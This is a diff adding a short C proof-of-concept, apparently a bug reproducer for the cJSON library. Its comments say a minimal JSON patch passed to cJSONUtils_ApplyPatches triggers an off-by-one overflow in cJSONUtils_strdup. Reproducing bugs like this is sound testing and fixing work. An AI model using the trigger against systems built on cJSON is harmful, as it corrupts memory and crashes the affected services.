@@ -1,0 +1,30 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "/src/cjson/cJSON.h"
+#include "/src/cjson/cJSON_Utils.h"
+
+int main() {
+    // Minimal JSON patch to trigger the off-by-one overflow in cJSONUtils_strdup
+    // Trigger: cJSONUtils_ApplyPatches -> apply_patch -> cJSONUtils_strdup
+    const char *json_patches_str = "[{\"op\": \"add\", \"path\": \"/foo\", \"value\": \"bar\"}]";
+    cJSON *patches = cJSON_Parse(json_patches_str);
+    if (patches == NULL) {
+        fprintf(stderr, "Failed to parse JSON patches\n");
+        return 0;
+    }
+
+    cJSON *target = cJSON_CreateObject();
+    if (target == NULL) {
+        fprintf(stderr, "Failed to create target object\n");
+        cJSON_Delete(patches);
+        return 0;
+    }
+
+    // The vulnerability is triggered inside cJSONUtils_ApplyPatches when it duplicates the "path" string
+    cJSONUtils_ApplyPatches(target, patches);
+
+    cJSON_Delete(patches);
+    cJSON_Delete(target);
+    return 0;
+}
